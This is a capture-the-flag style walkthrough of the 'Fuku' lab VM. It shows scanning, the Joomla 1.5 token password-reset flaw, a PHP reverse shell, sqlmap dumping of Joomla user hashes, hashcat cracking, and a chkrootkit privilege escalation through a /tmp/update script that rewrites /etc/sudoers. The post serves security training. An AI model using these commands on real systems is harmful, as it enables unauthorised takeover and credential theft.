---
layout: post
title: "SecTalks: BNE0x02 - Fuku"
date: 2016-07-18 16:00:27 -0500
comments: true
categories: [vulhub, joomla!,chrootkit]
---


###Tools:

* netdiscover
* Nmap
* Netcat
* Wfuzz
* Nikto
* Joomscan

###Vulnerability:

* [Joomla 1.5.x - (Token) Remote Admin Change Password](https://www.exploit-db.com/exploits/6234/)
* [Chkrootkit - Local Privilege Escalation](https://www.exploit-db.com/exploits/38775/)
* [Joomla HD FLV Player SQL Injection Vulnerability](https://www.exploit-db.com/exploits/33673/)

<!--more-->

### Use Joomla! Remote Admin Chnage Password Exploit

Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.56.0/24`

{% img  /images/blog/vulhub/fuku/Capture1.JPG   [title manually exploit [alt text]] %}

192.168.56.134 is the target.

Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.56.134 -p-`


{% img  /images/blog/vulhub/fuku/Capture2.JPG   [title manually exploit [alt text]] %}

as we can see, almost every port is opening. I guess the target machine doesn't want hacker know which services are exactly running.

I use nc to read some ports such as 80 22 23. Port 22 gets result like:

```
SSH-2.0-OpenSSH 6.7p1 Ububtu-5ubuntu1
```

while the rest of ports get the results:

{% img  /images/blog/vulhub/fuku/Capture14.JPG   [title manually exploit [alt text]] %}

looks like I need to filter ports like these. I wrote a script to make life easier [filter.py](https://github.com/wg135/script/blob/master/filter.py)

After running the script, I find only port 22 and port 13370 are opening.

check the http://192.168.56.134:13370. I got this


{% img  /images/blog/vulhub/fuku/Capture3.JPG   [title manually exploit [alt text]] %}

review the code:

{% img  /images/blog/vulhub/fuku/Capture4.JPG   [title manually exploit [alt text]] %}

Looks like Joomla!

use wfuzz to scan

`wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.134:13370/FUZZ 2>/dev/null`


{% img  /images/blog/vulhub/fuku/Capture5.JPG   [title manually exploit [alt text]] %}

get some interesting path names


use Nikto to scan

`nikto -h http://192.168.56.134:13370`

{% img  /images/blog/vulhub/fuku/Capture6.JPG   [title manually exploit [alt text]] %}


check http://192.168.56.134:13370/administrator/ get the login page:

{% img  /images/blog/vulhub/fuku/Capture7.JPG   [title manually exploit [alt text]] %}

Now I can confirm it is Joomla!


use joomscan to scan:

`joomscan -u http://192.168.56.134:13370`

get the result:

{% img  /images/blog/vulhub/fuku/Capture8.JPG   [title manually exploit [alt text]] %}

follow the steps:

* go to http://192.168.56.134/index.php?option=com_user&view=reset&layout=confirm
* Write into field "token" char ' and Click OK.

{% img  /images/blog/vulhub/fuku/Capture15.JPG   [title manually exploit [alt text]] %}

* input new password for admin

{% img  /images/blog/vulhub/fuku/Capture16.JPG   [title manually exploit [alt text]] %}

* go to http://192.168.56.134/administrator/ to login with new password

{% img  /images/blog/vulhub/fuku/Capture9.JPG   [title manually exploit [alt text]] %}

Since it is Japanese version, I followed my post [sickos1.2](http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/) to upload php reverse shell (usr/share/webshells/php/php-reverse-shell.php).

{% img  /images/blog/vulhub/fuku/Capture17.JPG   [title manually exploit [alt text]] %}

I will edit beez file, copy the php reverse shell code to it and replace the IP address and port

{% img  /images/blog/vulhub/fuku/Capture10.JPG   [title manually exploit [alt text]] %}

set up netcat and get the shell

{% img  /images/blog/vulhub/fuku/Capture11.JPG   [title manually exploit [alt text]] %}

However, I cannot execute most commands even `python`

{% img  /images/blog/vulhub/fuku/Capture12.JPG   [title manually exploit [alt text]] %}


try:

`python2.7 -c 'import pty; pty.spawn("/bin/bash")'` 

works!

Now try to enumerate the os.

`ps aux |grep root`

{% img  /images/blog/vulhub/fuku/Capture18.JPG   [title manually exploit [alt text]] %}

looks like the `chkrootkit 0.49` is available.

I followed my previous post [sickos1.2](http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/) to upload php reverse shell (usr/share/webshells/php/php-reverse-shell.php) to get the root:

```
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

then:

`chmod 777 /tmp/update`

then:

`ls -al /etc/sudoers`

finally get the root:

`sudo su`

{% img  /images/blog/vulhub/fuku/Capture13.JPG   [title manually exploit [alt text]] %}






### Exploit Joomla HD FLV Player SQL Injection

in http://192.168.56.134/, I found the target uses HD FLV Player

{% img  /images/blog/vulhub/fuku/Capture19.JPG   [title manually exploit [alt text]] %}

check the source code:

{% img  /images/blog/vulhub/fuku/Capture20.JPG   [title manually exploit [alt text]] %}

`searchsploit HD FLV`

{% img  /images/blog/vulhub/fuku/Capture25.JPG   [title manually exploit [alt text]] %}


follow the instructions:

```
sqlmap -u "http://192.168.56.134:13370/index.php?option=com_hdflvplayer&id=1" -p id --dbms mysql --tables --level=5 --risk=3
```


{% img  /images/blog/vulhub/fuku/Capture21.JPG   [title manually exploit [alt text]] %}

now get the columns of the table `jos_users`

```
sqlmap -u "http://192.168.56.134:13370/index.php?option=com_hdflvplayer&id=1" -p id --dbms mysql -T jos_users --columns
```


{% img  /images/blog/vulhub/fuku/Capture22.JPG   [title manually exploit [alt text]] %}

now I am interested in column username and password

```
sqlmap -u "http://192.168.56.134:13370/index.php?option=com_hdflvplayer&id=1" -p id --dbms mysql -T jos_users -C username,password --dump
```


{% img  /images/blog/vulhub/fuku/Capture23.JPG   [title manually exploit [alt text]] %}

The first part should be hash and the second part should be salt. I used joomla password crack tool [joomlacrack.pl](https://github.com/wg135/script/blob/master/joomla.pl). Here is also my python version [crackjoomla.py](https://github.com/wg135/script/blob/master/crackjoomla.py)

crack admin's password now

{% img  /images/blog/vulhub/fuku/Capture26.JPG   [title manually exploit [alt text]] %}

{% img  /images/blog/vulhub/fuku/Capture24.JPG   [title manually exploit [alt text]] %}

Then login as admin, upload php reverse shell, same as I worked in the first part of this post.


Aslo, since the hash format is like hash:salt. I found the [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes), the MD5 format should be `md5($pass.$salt)`, so that in hashcat for option `-m` the value should be 10 (hashcat --help, check the * Hash types) 

use hashcat crack:

`hashcat -m 10 -a 0 -o joompass.txt --remove 61.hash /usr/share/wordlists/rockyou.txt`


DONE



















